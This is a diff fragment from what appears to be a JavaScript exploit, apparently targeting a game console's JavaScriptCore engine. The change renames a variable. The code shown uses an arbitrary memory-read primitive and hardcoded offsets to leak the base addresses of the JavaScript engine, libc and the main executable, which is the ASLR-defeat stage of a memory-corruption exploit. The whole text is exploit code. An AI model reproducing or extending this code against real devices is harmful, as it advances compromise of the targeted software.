@@ -550,12 +550,12 @@ log(`native_executable_function: ${native_executable_function}`)
 var native_executable_constructor = prim.read8(native_executable.add(new BigInt(0, 0x48)))
 log(`native_executable_constructor: ${native_executable_constructor}`)
 
-var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))
+var jsc_addr = native_executable_function.sub(new BigInt(0, 0xC6380))
 
-var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E72398)))
+var _error_addr = prim.read8(jsc_addr.add(new BigInt(0, 0x1E72398)))
 log(`_error_addr: ${_error_addr}`)
 
-var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
+var strerror_addr = prim.read8(jsc_addr.add(new BigInt(0, 0x1E723B8)))
 log(`strerror_addr: ${strerror_addr}`)
 
 var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))
@@ -568,7 +568,7 @@ log(`jsmaf_gc_native_addr: ${jsmaf_gc_native_addr}`)
 
 var eboot_addr = jsmaf_gc_native_addr.sub(new BigInt(0, 0x39330))
 
-log(`base_addr: ${base_addr}`)
+log(`jsc_addr: ${jsc_addr}`)
 log(`libc_addr: ${libc_addr}`)
 log(`eboot_addr: ${eboot_addr}`)
 
